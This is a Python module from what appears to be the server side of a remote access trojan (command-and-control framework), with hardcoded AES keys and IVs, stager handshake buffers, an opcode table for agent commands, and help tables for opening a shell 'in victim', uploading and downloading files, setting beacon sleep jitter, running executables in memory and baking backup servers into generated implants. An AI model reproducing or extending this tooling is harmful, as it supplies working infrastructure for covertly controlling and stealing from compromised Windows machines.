from tabulate import tabulate
from prompt_toolkit.styles import Style
import os
import ctypes

DEFAULT_GREETING_BUF = b"\xDC\x51\x71\xEC\x48\x0D\x24\x42\x11\x5E\x14\xDA\x35\x8B\x6C\x0F\x07\x3B\xDF\xF6\x28\xCC\xEE\x37\xE2\x2B\x1C\x11\xD4\xF7\xE3\x3A"
STAGER_GREETING_BUF_MACRO = b"\x7F\xB6\x6D\x80\x3E\x72\xAD\xEC\x6E\xEC\xE9\xD7\x08\x7E\xB7\x0E\x69\x29\xB5\xB2\xC7\xAA\xB2\xF8\x4C\x79\xFE\x2B\x91\xA0\x57\xAB"
STAGER_GREETING_BUF_NORMAL = b"\x2E\x07\x96\x4B\xDA\xEB\x09\x9F\xCB\xF8\xB1\x91\x3E\x03\xA8\x17\xD7\x70\xC5\x26\x74\xC0\x59\xC8\xB4\x94\x2C\x22\x8C\xDE\xB7\x4F"
VALIDATION_HEADER_SIZE = 47
GREETING_SIZE = 32

FILE_MESSAGE_SIZE = 112000
FILE_MESSAGE_SIZE_C = 2000000

AES_KEY = b"\x3D\x50\x56\xBF\x1C\xC3\xB0\x45\x27\xB9\x87\xF9\x16\x4C\x24\xD0\x78\x61\x59\xF0\x75\xA4\xBD\x5D\xB5\x6E\x5B\xC3\x94\x27\xBE\xCF"
IV = b"\x95\x97\x46\x0E\xB4\xE6\x8D\xDA\x5A\x5D\x5F\x29\x24\xCD\x9A\x53"
STAGER_AES_KEY = b"\x9A\x09\xFD\x92\x92\x11\x34\x57\xD7\x2E\xFA\xA5\xB3\xB5\x42\xC0\x07\xF5\x29\x13\x9C\xB3\x67\xCB\x91\x7B\xA6\xA9\x5F\xD0\x09\x8E"
SATGER_IV = b"\xD7\xE6\x42\x2C\xC0\xA3\x12\x08\x71\x77\x16\xB2\x8F\x3E\xB0\x4B"

# sum_key = [6, -2, 4, 6, -3, -8, 9, -5, 1, 6, -6, 1, 7, 6, -9, -7, 1, -4, -7, -3, 6, 9, -9, 7, -6, -2, 3, -3, 1, -5, 6, 5, -9, 3, 6, -10, -9, 9, 1, -7, -8, -9, -1, 8, 3, -6, -8, -4, -3, 9]
# satger_sum_key = [3, 7, -5, -6, 7, -1, -6, 8, -1, -4, 2, -7, 6, -3, 4, -8, -8, -9, -5, 6, -2, -9, -2, -3, 7, -4, -4, 1, -3, -6, -1, -5, 2, -5, 7, 4, 6, 4, 5, 4, -10, -1, 3, 4, 6, -2, -6, 7, -5, 4]

additional_notes_table = [['Notes'],
# ['1.', 'when you open shell, there will be much more network traffic (2 req/sec), so please close shell with Ctrl+C when you no longer need it.'],
['2.', 'if you encounter files that their name has non-english alphabets, which will be shown as ?????.txt (for example), you can see thier names\ncorrectly by entering this command in shell : chcp 65001'],
['3.', 'use Shift+Ctrl+C for copy, using ctrl+c will cause the server to shut down, or the shell to close.'],
# ['4.', 'if you want to download a file that its name has non-english alphabets, this method is recomended:'],
# ['', '4.1. see the name of the file you want to download and memorise its size in bytes. (enter chcp 65001, than dir)'],
# ['', '4.2. open powershell (type powershell in shell)'],
# ['', '4.3. type this command : \nGet-ChildItem -Path "path of folder containing your file" -Filter "*.your file extension" | Where-Object\n{$_.Length -eq size of your files in bytes} | ForEach-Object {Copy-Item -Path $_.FullName -Destination\n(Join-Path -Path $env:TEMP -ChildPath "a name for your file")}\nexample : Get-ChildItem -Path "D:\\projects\\" -Filter "*.txt" | Where-Object {$_.Length -eq 40} | ForEach-Object {Copy-Item -Path $_.FullName -Destination\n(Join-Path -Path $env:TEMP -ChildPath "c.txt")}'],
# ['', '4.4. now exit shell'],
# ['', '4.5. type this : d "C:\\Users\\<username>\\AppData\\Local\\Temp\\name of your file" -> "path for your file in your system"\nexample : d "C:\\Users\\Pc\\AppData\\Local\\Temp\\c.txt" -> "C:\\Users\\Public\\Public Downloads\\c.txt"'],
# ['', '4.6. your downlod is complete. now delete the file in temp with this command in shell : del "C:\\Users\\<username>\\AppData\\Local\\Temp\\name of your file"'],
['5.', 'if you want the server to run on a specific ip and port, give them as argument to server like this: \'-ip 10.10.10.10 -p 8000\'.'],
['6.', 'every thing that you have typed or has printed to screen, will be saved in packages\\history\\logs folder, seprated by day. you can check them if you need your\nwork hitory.'],
['7.', 'when server shuts down and runs again, it will get the sessions and the ip and port from the database, if you dont want them, run server with -cdb to clear the database.'],
# ['8.', 'you can use environment strings like %localappdata% in path\'s in upload, download and run.'],
# ['9.', 'you can have multiple cmd\'s or any other x64 microsoft executables (not .net) using run command and you can switch between them.'],
# ['10.', 'when using run module, keep in mind that maximum number of exe\'s is 100.'],
# ['11.', 'if you have multiple servers and you want to use them as backup, write thier ip and ports in a file and give it with -backups argument, than,\nthe generated exe will have all those servers as backup.\nmaximum number of backups is 19. the input file format must be like this (in each line): ip:port'],
['12.', 'if you want to delete all data of the server, delete history folder.'],
['13.', 'if you want to see the current server ip and port and running time, use h command.'],]
manual_interact_table = [['command', 'description', 'example'],
['s', 'show sessions.', ''],
['i <session id>', 'interact with the session.', 'i 1'],
['h', 'show help.', ''],
['h -v', 'show additional help and notes.', ''],
['c', 'check session connection.', ''],
['sleep <min> <max>', 'set sleep min and max seconds for client. default is 1 to 9 seconds.', 'sleep 6 6\nsleep 10 100'],
['shell', 'open cmd in victim and interact with it. press Ctrl+C to exit cmd and return.', ''],
['u "<local path>" -> "<remote path>"', 'upload the file in local path to remote path.', 'u "/root/p.txt" -> "D:\\p.txt"'],
# ['d "<remote path>" -> "<local path>"', 'download the file in remote path to local path.', 'd "D:\\p.txt" -> "/root/p.txt"'],
# ['run', 'run an exe in victim system. after this command you will specify whether it needs to be uploaded or not,\nits path and args, whether it run on memory or on disk and whewther you want to interact with it or not.', ''],
# ['lsrun', 'shows list of exe\'s that have been run by agent.', ''],
# ['goto <exe id>', 'go\'s to interactive console of corresponding exe. works only in interactive exe\'s. use Ctrl+C to return.', 'goto 1'],
# ['terminate <exe id>', 'terminates the corresponding exe.', 'terminate 1'],
['esc', 'back-ground session (use interact session to return to this session).', ''],
# ['r', 'reset connection, try this when you encounter time outs. wait till you see the "missed you" phrase.', ''],
# ['r -f', 'terminate agent and spawn again, try this when reset doesn\'t work. wait till you see the "missed you" phrase.', '']
]
manual_general_table = [['command', 'description', 'example'],
['s', 'show sessions.', ''],
['i <session id>', 'interact with the session.', 'i 1'],
['h', 'show help.', ''],
['h -v', 'show additional help and notes.', '']]
logo= """
                             ..                             
                        .  .-@@-.  .                        
                      .*:   @@@@   :*.                      
                     -@=    =@@=    =@-                     
                    *@=     =@@=     +@#                    
                   @@-      =@@=      -@@                   
                 %@@:       =@@=       :@@#                 
                =@@@.       =@@=       .@@@=                
                  #@@@.     =@@=     :@@@%                  
                    *@@@.   =@@=    @@@#                    
                      @@@@  =@@=  @@@@                      
                        @@@%+@@=%@@@                        
                         .@@@@@@@@.                         
                          :@@@@@@:                          
                         @@@@@@@@@@                         
                       @@@@+=@@=+@@@@                       
                     *@@@+  =@@=  +@@@#                     
                   +@@@@    =@@=    %@@@+                   
                 *@@@@.     =@@=     :@@@@+                 
                :@@@@:      =@@=      :@@@@-                
                  +@@@@.    =@@=    .@@@@+                  
                    =@@@+   =@@=   =@@@+                    
                      @@@@- =@@- -@@@@                      
                       .@@@@*@@+@@@@.                       
                         :@@@@@@@@:                         
                           +@@@@+                           
                             ++  
                    Rise and die again.
"""

def _ansi_bold(text: str) -> str:
    return f"\x1b[1m{text}\x1b[0m"

def _ansi_wrap(text: str, *, prefix: str = "", suffix: str = "\x1b[0m") -> str:
    return f"{prefix}{text}{suffix}" if prefix else text

def _ansi_fg(color_code: str) -> str:
    return f"\x1b[{color_code}m"

def _ansi_dim() -> str:
    return "\x1b[2m"

def _ansi_reset() -> str:
    return "\x1b[0m"

def _enable_windows_vt_mode() -> None:
    if os.name != "nt":
        return
    try:
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        mode = ctypes.c_uint()
        if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
            kernel32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING)
    except Exception:
        # ANSI rendering is best-effort on Windows.
        pass

def pretty_tabulate(
    table,
    headers="firstrow",
    tablefmt: str = "rounded_grid",
    *,
    zebra: bool = True,
    highlight_columns: list[int] | None = None,
    enable_ansi: bool | None = None,
    header_color_code: str = "96",
    highlight_color_code: str = "93",
    zebra_color_code: str = "90",
    row_dim_fn=None,
    row_color_fn=None,
    cell_color_fn=None,
    **kwargs,
) -> str:
    if enable_ansi is None:
        enable_ansi = os.getenv("NO_COLOR") is None
    if enable_ansi:
        _enable_windows_vt_mode()

    if headers not in (None, "firstrow") and isinstance(headers, (list, tuple)):
        if enable_ansi:
            hdr_prefix = "\x1b[1m" + _ansi_fg(header_color_code)
            headers = [_ansi_wrap(str(h), prefix=hdr_prefix, suffix=_ansi_reset()) for h in headers]
        else:
            headers = [str(h) for h in headers]

    if highlight_columns is None:
        highlight_columns = []

    styled_table = table
    if enable_ansi and (zebra or highlight_columns or row_dim_fn is not None or row_color_fn is not None or cell_color_fn is not None):
        styled_table = []
        for row_i, row in enumerate(table):
            row_list = list(row)
            row_dim = bool(row_dim_fn(row, row_i)) if row_dim_fn is not None else False
            row_color = row_color_fn(row, row_i) if row_color_fn is not None else None
            for col_i, cell in enumerate(row_list):
                cell_s = str(cell)
                prefix = ""
                if zebra and (row_i % 2 == 1):
                    prefix += _ansi_dim() + _ansi_fg(zebra_color_code)
                if row_dim:
                    prefix += _ansi_dim()
                if row_color:
                    prefix += _ansi_fg(str(row_color))
                if col_i in highlight_columns:
                    prefix += "\x1b[1m" + _ansi_fg(highlight_color_code)
                cell_color = cell_color_fn(row, row_i, col_i, cell) if cell_color_fn is not None else None
                if cell_color:
                    prefix += "\x1b[1m" + _ansi_fg(str(cell_color))
                if prefix:
                    cell_s = _ansi_wrap(cell_s, prefix=prefix, suffix=_ansi_reset())
                row_list[col_i] = cell_s
            styled_table.append(row_list)

    return tabulate(styled_table, headers=headers, tablefmt=tablefmt, **kwargs)

manual_general = pretty_tabulate(manual_general_table, headers="firstrow")
manual_interact = pretty_tabulate(manual_interact_table, headers="firstrow")
additional_notes = pretty_tabulate(additional_notes_table, headers="firstrow")

sessions_header_verbose = ['Session Id', 'Address', 'User', 'ComputerName', 'Domain', 'OsVersion', 'VM', 'LastCheckTimePassed', 'SleepTime', 'CreateTime', 'Requests']
# exes_header = ['EXE Id', 'Type', 'Path', 'Pid', 'Interactive', 'Arguments', 'CreateTime']

prompt_style = Style.from_dict({'user': '#00ffff', 'at': '#49E034', 'ip': '#FF85FF', 'normal': '#FFDC99'})

class str_mappers():
    no_str          = b"\x00\x00\x00\x00"
    check           = b"\x01\x00\x00\x00"
    set_sleep       = b"\x02\x00\x00\x00"
    create_shell    = b"\x03\x00\x00\x00"
    exec_command    = b"\x04\x00\x00\x00"
    shell_result    = b"\x05\x00\x00\x00"
    exit_shell      = b"\x06\x00\x00\x00"
    upload          = b"\x07\x00\x00\x00"
    filedata        = b"\x08\x00\x00\x00"
    # download        = b"\x09\x00\x00\x00"
    # down_index      = b"\x0a\x00\x00\x00"
    # reset           = b"\x0b\x00\x00\x00"
    # re_spawn        = b"\x0c\x00\x00\x00"
    connected       = b"\x0d\x00\x00\x00"
    success         = b"\x0e\x00\x00\x00"
    success_        = b"\x0f\x00\x00\x00"
    failed          = b"\x10\x00\x00\x00"
    no_data         = b"\x11\x00\x00\x00"
    # create_process  = b"\x12\x00\x00\x00"
    # upload_hold     = b"\x13\x00\x00\x00"
    # file_data_hold  = b"\x14\x00\x00\x00"
    # create_thread   = b"\x15\x00\x00\x00"
    # terminate       = b"\x16\x00\x00\x00"
    # shell_result_exe= b"\x17\x00\x00\x00"
    # exec_command_exe= b"\x18\x00\x00\x00"
    # goto_exe        = b"\x19\x00\x00\x00"
    # come_out_of_exe = b"\x1a\x00\x00\x00"
